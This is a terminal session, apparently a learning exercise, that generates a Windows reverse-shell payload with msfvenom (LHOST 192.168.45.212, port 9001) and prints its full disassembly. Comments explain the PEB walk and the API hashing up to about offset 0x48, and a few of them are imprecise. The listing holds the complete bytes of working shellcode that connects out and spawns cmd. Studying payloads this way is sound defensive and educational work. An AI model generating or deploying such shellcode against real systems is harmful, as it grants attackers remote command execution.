❯ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.212 LPORT=9001 -f raw -o shell_reverse.bin --encoder none

❯ i686-linux-gnu-objdump -D -b binary -m i386 -M intel shell_reverse.bin > shell_reverse.asm

❯ uv run python3 disasm.py


shell_reverse.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:	fc                   	cld                                       ; clear direction flag (string ops go forward)
   1:	e8 82 00 00 00       	call   0x88                               ; call/pop PIC pushes 0x06 onto stack, jumps to 0x88
   6:	60                   	pusha                                     ; save all registers (EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI)
   7:	89 e5                	mov    ebp,esp                            ; EBP = stack pointer (frame for saved regs)
   9:	31 c0                	xor    eax,eax                            ; EAX = 0
   b:	64 8b 50 30          	mov    edx,DWORD PTR fs:[eax+0x30]        ; EDX = PEB *
   f:	8b 52 0c             	mov    edx,DWORD PTR [edx+0x0c]           ; EDX = PEB -> Ldr
  12:	8b 52 14             	mov    edx,DWORD PTR [edx+0x14]           ; EDX = InMemoryOrderModuleList.Flink
  15:	8b 72 28             	mov    esi,DWORD PTR [edx+0x28]           ; ESI = BaseDllName.Buffer (wide string)
  18:	0f b7 4a 26          	movzx  ecx,WORD PTR [edx+0x26]            ; ECX = BaseDllName.Length in bytes
  1c:	31 ff                	xor    edi,edi                            ; EDI = 0 (hash accumulator?)
  1e:	ac                   	lods   al,BYTE PTR ds:[esi]               ; AL = next byte from name string; ESI++
  1f:	3c 61                	cmp    al,0x61                            ; is char below 'a'
  21:	7c 02                	jl     0x25                               ; yes -> skip case fold
  23:	2c 20                	sub    al,0x20                            ; fold lowercase -> uppercase (inverse of OR 0x20)
  25:	c1 cf 0d             	ror    edi,0xd                            ; ROR13: rotate hash right 13
  28:	01 c7                	add    edi,eax                            ; ADD current char into hash (additive, not XOR)
  2a:	e2 f2                	loop   0x1e                               ; ECX-- ; jnz -> process next character
  2c:	52                   	push   edx                                ; save current LDR entry point
  2d:	57                   	push   edi                                ; save current BaseDllName.Buffer
  2e:	8b 52 10             	mov    edx,DWORD PTR [edx+0x10]           ; EDX = DllBaseAddress
  31:	8b 4a 3c             	mov    ecx,DWORD PTR [edx+0x3c]           ; ECX = Offset of the PE header to the MZ header (4d 5a)
                                                                        ; IMAGE_DOS_HEADER e_lfanew = (unint32_t)(base +0x3c)
  34:	8b 4c 11 78          	mov    ecx,DWORD PTR [ecx+edx*1+0x78]     ; ECX = Offset of the exports table from the start of the Dll base image
                                                                        ; IMAGE_DOS_HEADER e_lfanew = (unint32_t)(base +0x3c)
  38:	e3 48                	jecxz  0x82                               ; if ECX == 0, skip this module and continue loader walk
  3a:	01 d1                	add    ecx,edx                            ; DllBase + export table RVA
  3c:	51                   	push   ecx                                ; save ECX to the stack
  3d:	8b 59 20             	mov    ebx,DWORD PTR [ecx+0x20]           ; EBX = Address of Names RVA (export dir + 0x20)
  40:	01 d3                	add    ebx,edx                            ; EBX = Address of Names VA (DWORD[] of RVAs)
  42:	8b 49 18             	mov    ecx,DWORD PTR [ecx+0x18]           ; ECX = Number of Names (count of names exports)
  45:	e3 3a                	jecxz  0x81                               ; jump to the instruction pointer + 2 +(-127)
                                                                        ; if no named exports, skip module
  47:	49                   	dec    ecx                                ; ECX - 1 (number of names exports)
  48:	8b 34 8b             	mov    esi,DWORD PTR [ebx+ecx*4]          ; 
  4b:	01 d6                	add    esi,edx
  4d:	31 ff                	xor    edi,edi
  4f:	ac                   	lods   al,BYTE PTR ds:[esi]
  50:	c1 cf 0d             	ror    edi,0xd
  53:	01 c7                	add    edi,eax
  55:	38 e0                	cmp    al,ah
  57:	75 f6                	jne    0x4f
  59:	03 7d f8             	add    edi,DWORD PTR [ebp-0x8]
  5c:	3b 7d 24             	cmp    edi,DWORD PTR [ebp+0x24]
  5f:	75 e4                	jne    0x45
  61:	58                   	pop    eax
  62:	8b 58 24             	mov    ebx,DWORD PTR [eax+0x24]
  65:	01 d3                	add    ebx,edx
  67:	66 8b 0c 4b          	mov    cx,WORD PTR [ebx+ecx*2]
  6b:	8b 58 1c             	mov    ebx,DWORD PTR [eax+0x1c]
  6e:	01 d3                	add    ebx,edx
  70:	8b 04 8b             	mov    eax,DWORD PTR [ebx+ecx*4]
  73:	01 d0                	add    eax,edx
  75:	89 44 24 24          	mov    DWORD PTR [esp+0x24],eax
  79:	5b                   	pop    ebx
  7a:	5b                   	pop    ebx
  7b:	61                   	popa
  7c:	59                   	pop    ecx
  7d:	5a                   	pop    edx
  7e:	51                   	push   ecx
  7f:	ff e0                	jmp    eax
  81:	5f                   	pop    edi
  82:	5f                   	pop    edi
  83:	5a                   	pop    edx
  84:	8b 12                	mov    edx,DWORD PTR [edx]
  86:	eb 8d                	jmp    0x15
  88:	5d                   	pop    ebp
  89:	68 33 32 00 00       	push   0x3233
  8e:	68 77 73 32 5f       	push   0x5f327377
  93:	54                   	push   esp
  94:	68 4c 77 26 07       	push   0x726774c
  99:	ff d5                	call   ebp
  9b:	b8 90 01 00 00       	mov    eax,0x190
  a0:	29 c4                	sub    esp,eax
  a2:	54                   	push   esp
  a3:	50                   	push   eax
  a4:	68 29 80 6b 00       	push   0x6b8029
  a9:	ff d5                	call   ebp
  ab:	50                   	push   eax
  ac:	50                   	push   eax
  ad:	50                   	push   eax
  ae:	50                   	push   eax
  af:	40                   	inc    eax
  b0:	50                   	push   eax
  b1:	40                   	inc    eax
  b2:	50                   	push   eax
  b3:	68 ea 0f df e0       	push   0xe0df0fea
  b8:	ff d5                	call   ebp
  ba:	97                   	xchg   edi,eax
  bb:	6a 05                	push   0x5
  bd:	68 c0 a8 2d d4       	push   0xd42da8c0
  c2:	68 02 00 23 29       	push   0x29230002
  c7:	89 e6                	mov    esi,esp
  c9:	6a 10                	push   0x10
  cb:	56                   	push   esi
  cc:	57                   	push   edi
  cd:	68 99 a5 74 61       	push   0x6174a599
  d2:	ff d5                	call   ebp
  d4:	85 c0                	test   eax,eax
  d6:	74 0c                	je     0xe4
  d8:	ff 4e 08             	dec    DWORD PTR [esi+0x8]
  db:	75 ec                	jne    0xc9
  dd:	68 f0 b5 a2 56       	push   0x56a2b5f0
  e2:	ff d5                	call   ebp
  e4:	68 63 6d 64 00       	push   0x646d63
  e9:	89 e3                	mov    ebx,esp
  eb:	57                   	push   edi
  ec:	57                   	push   edi
  ed:	57                   	push   edi
  ee:	31 f6                	xor    esi,esi
  f0:	6a 12                	push   0x12
  f2:	59                   	pop    ecx
  f3:	56                   	push   esi
  f4:	e2 fd                	loop   0xf3
  f6:	66 c7 44 24 3c 01 01 	mov    WORD PTR [esp+0x3c],0x101
  fd:	8d 44 24 10          	lea    eax,[esp+0x10]
 101:	c6 00 44             	mov    BYTE PTR [eax],0x44
 104:	54                   	push   esp
 105:	50                   	push   eax
 106:	56                   	push   esi
 107:	56                   	push   esi
 108:	56                   	push   esi
 109:	46                   	inc    esi
 10a:	56                   	push   esi
 10b:	4e                   	dec    esi
 10c:	56                   	push   esi
 10d:	56                   	push   esi
 10e:	53                   	push   ebx
 10f:	56                   	push   esi
 110:	68 79 cc 3f 86       	push   0x863fcc79
 115:	ff d5                	call   ebp
 117:	89 e0                	mov    eax,esp
 119:	4e                   	dec    esi
 11a:	56                   	push   esi
 11b:	46                   	inc    esi
 11c:	ff 30                	push   DWORD PTR [eax]
 11e:	68 08 87 1d 60       	push   0x601d8708
 123:	ff d5                	call   ebp
 125:	bb f0 b5 a2 56       	mov    ebx,0x56a2b5f0
 12a:	68 a6 95 bd 9d       	push   0x9dbd95a6
 12f:	ff d5                	call   ebp
 131:	3c 06                	cmp    al,0x6
 133:	7c 0a                	jl     0x13f
 135:	80 fb e0             	cmp    bl,0xe0
 138:	75 05                	jne    0x13f
 13a:	bb 47 13 72 6f       	mov    ebx,0x6f721347
 13f:	6a 00                	push   0x0
 141:	53                   	push   ebx
 142:	ff d5                	call   ebp
